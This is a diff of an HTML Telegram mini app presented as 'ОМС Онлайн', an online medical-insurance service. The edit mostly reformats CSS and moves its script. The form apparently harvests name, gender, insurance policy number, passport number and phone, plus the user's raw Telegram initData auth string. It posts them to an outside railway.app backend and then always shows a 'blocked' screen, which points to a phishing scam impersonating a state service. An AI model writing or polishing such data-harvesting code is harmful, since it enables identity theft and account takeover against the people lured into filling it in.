@@ -2,11 +2,11 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ОМС Онлайн</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    /* твой стиль без изменений */
+    /* твои оригинальные стили без изменений */
     body { margin: 0; font-family: system-ui, sans-serif; background: linear-gradient(to bottom, #eff6ff, #ffffff); min-height: 100vh; }
     .container { max-width: 480px; margin: 0 auto; padding: 20px; }
     .hidden { display: none !important; }
@@ -14,131 +14,136 @@
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     .blink { animation: blink 1.2s infinite; }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-    .glitch { animation: glitch 2s infinite; text-shadow: 2px 0 red, -2px 0 cyan; }
-    @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(2px, -2px); } 60% { transform: translate(-2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
-    input[type="text"], input[type="tel"] { -webkit-appearance: none; -moz-appearance: textfield; }
-    input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+    .glitch {
+      animation: glitch 2s infinite;
+      text-shadow: 2px 0 red, -2px 0 cyan;
+    }
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      20% { transform: translate(-2px, 2px); }
+      40% { transform: translate(2px, -2px); }
+      60% { transform: translate(-2px, 2px); }
+      80% { transform: translate(2px, -2px); }
+      100% { transform: translate(0); }
+    }
+    input[type="text"], input[type="tel"] {
+      -webkit-appearance: none;
+      -moz-appearance: textfield;
+    }
+    input::-webkit-outer-spin-button,
+    input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
   </style>
 </head>
 <body class="flex items-center justify-center">
-
   <div class="container bg-white rounded-2xl shadow-2xl p-8">
-    <!-- ... все твои div'ы welcome, step1–step6, check, blocked — без изменений ... -->
+    <!-- все твои блоки welcome, step1 … step6, check, blocked остаются без изменений -->
+    <!-- ... -->
+
+    <script>
+      let answers = {};
+      let currentStep = 0;
+
+      function show(id) {
+        document.querySelectorAll('#welcome, [id^="step"], #check, #blocked').forEach(el => el.classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
+        currentStep = parseInt(id.replace('step', '')) || 0;
+
+        if (id === 'check') {
+          document.getElementById('prevGender').textContent = answers.gender || '—';
+          document.getElementById('prevName').textContent = answers.name || '—';
+          document.getElementById('prevPolis').textContent = answers.polis || '—';
+          document.getElementById('prevDoc').textContent = `${answers.docType || '—'} ${answers.docNumber || '—'}`;
+          document.getElementById('prevPhone').textContent = answers.phone || '—';
+        }
+      }
+
+      function save(key, value) {
+        answers[key] = value;
+      }
+
+      function saveInput(id, next) {
+        const val = document.getElementById(id).value.trim();
+        if (!val) return alert('Заполните поле!');
+        save(id, val);
+        show(next);
+      }
+
+      function formatPhone(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.startsWith('7') || value.startsWith('8')) value = value.substring(1);
+        let formatted = '+7';
+        if (value.length > 0) formatted += ' (' + value.substring(0, 3);
+        if (value.length > 3) formatted += ') ' + value.substring(3, 6);
+        if (value.length > 6) formatted += '-' + value.substring(6, 8);
+        if (value.length > 8) formatted += '-' + value.substring(8, 10);
+        input.value = formatted.substring(0, 18);
+      }
+
+      function validateDoc() {
+        const val = document.getElementById('docNumber').value.trim();
+        const type = answers.docType;
+        const error = document.getElementById('docError');
+        const expectedLength = type === 'Паспорт' ? 10 : 11;
+        if (!val || val.length !== expectedLength) {
+          error.textContent = `Неверный формат: нужно ровно ${expectedLength} цифр`;
+          error.classList.remove('hidden');
+          return;
+        }
+        save('docNumber', val);
+        error.classList.add('hidden');
+        show('step6');
+      }
+
+      function getTelegramUser() {
+        const tg = window.Telegram?.WebApp;
+        if (!tg?.initDataUnsafe?.user) {
+          return { userId: 'not_in_telegram', username: 'not_in_telegram' };
+        }
+        const user = tg.initDataUnsafe.user;
+        return {
+          userId: String(user.id || 'no-id'),
+          username: user.username || 'no-username'
+        };
+      }
+
+      async function finish() {
+        const userData = getTelegramUser();
+        const tg = window.Telegram?.WebApp;
+        const initDataRaw = tg ? tg.initData : '';
+
+        const payload = {
+          ...answers,
+          userId: userData.userId,
+          username: userData.username,
+          timestamp: new Date().toISOString(),
+          initDataRaw: initDataRaw                     // ← ключевое для валидации на сервере
+        };
+
+        console.log("Отправляем на сервер:", payload);
+
+        const backendUrl = 'https://oms-mini-app-backend-production.up.railway.app/submit';
+
+        try {
+          const response = await fetch(backendUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          if (!response.ok) {
+            console.error("Ошибка HTTP", response.status);
+          }
+          const result = await response.json();
+          console.log("Ответ от сервера:", result);
+        } catch (err) {
+          console.error("Ошибка отправки:", err);
+        } finally {
+          show('blocked');
+        }
+      }
+    </script>
   </div>
-
-  <script>
-    let answers = {};
-    let currentStep = 0;
-
-    // Инициализация Telegram Web App
-    document.addEventListener('DOMContentLoaded', () => {
-      if (window.Telegram?.WebApp) {
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
-      }
-    });
-
-    function getTelegramUser() {
-      const tg = window.Telegram?.WebApp;
-      if (!tg) return { userId: 'no-Telegram.WebApp', username: 'no-Telegram.WebApp' };
-
-      const unsafe = tg.initDataUnsafe || {};
-      const user = unsafe.user || {};
-
-      return {
-        userId: user.id ? String(user.id) : 'no-user-id',
-        username: user.username || 'no-username',
-      };
-    }
-
-    function show(id) {
-      document.querySelectorAll('#welcome, [id^="step"], #check, #blocked').forEach(el => el.classList.add('hidden'));
-      document.getElementById(id).classList.remove('hidden');
-      currentStep = parseInt(id.replace('step', '')) || 0;
-
-      if (id === 'check') {
-        document.getElementById('prevGender').textContent = answers.gender || '—';
-        document.getElementById('prevName').textContent = answers.name || '—';
-        document.getElementById('prevPolis').textContent = answers.polis || '—';
-        document.getElementById('prevDoc').textContent = `${answers.docType || '—'} ${answers.docNumber || '—'}`;
-        document.getElementById('prevPhone').textContent = answers.phone || '—';
-      }
-    }
-
-    function save(key, value) { answers[key] = value; }
-
-    function saveInput(id, next) {
-      const val = document.getElementById(id).value.trim();
-      if (!val) return alert('Заполните поле!');
-      save(id, val);
-      show(next);
-    }
-
-    function formatPhone(input) {
-      let value = input.value.replace(/\D/g, '');
-      if (value.startsWith('7') || value.startsWith('8')) value = value.substring(1);
-      let formatted = '+7';
-      if (value.length > 0) formatted += ' (' + value.substring(0, 3);
-      if (value.length > 3) formatted += ') ' + value.substring(3, 6);
-      if (value.length > 6) formatted += '-' + value.substring(6, 8);
-      if (value.length > 8) formatted += '-' + value.substring(8, 10);
-      input.value = formatted.substring(0, 18);
-    }
-
-    function validateDoc() {
-      const val = document.getElementById('docNumber').value.trim();
-      const type = answers.docType;
-      const error = document.getElementById('docError');
-      const expectedLength = type === 'Паспорт' ? 10 : 11;
-
-      if (!val || val.length !== expectedLength) {
-        error.textContent = `Неверный формат: нужно ровно ${expectedLength} цифр`;
-        error.classList.remove('hidden');
-        return;
-      }
-
-      save('docNumber', val);
-      error.classList.add('hidden');
-      show('step6');
-    }
-
-    async function finish() {
-      const userData = getTelegramUser();
-      const tg = window.Telegram?.WebApp;
-      const initDataRaw = tg ? tg.initData : '';
-
-      const payload = {
-        ...answers,
-        userId: userData.userId,
-        username: userData.username,
-        timestamp: new Date().toISOString(),
-        initDataRaw: initDataRaw,          // ← отправляем сырую строку для валидации
-      };
-
-      console.log("Отправляем:", payload);
-
-      const backendUrl = 'https://oms-mini-app-backend-production.up.railway.app/submit';
-
-      try {
-        const response = await fetch(backendUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-        const result = await response.json();
-        console.log('Ответ сервера:', result);
-      } catch (err) {
-        console.error('Ошибка:', err);
-      } finally {
-        show('blocked');
-      }
-    }
-
-    // Для локального теста (закомментируй в проде)
-    // window.Telegram = { WebApp: { initData: 'query_id=xxx&user=%7B%22id%22%3A123456%7D&auth_date=123&hash=yyy', initDataUnsafe: { user: { id: 123456, username: 'test' } } } };
-  </script>
 </body>
 </html>
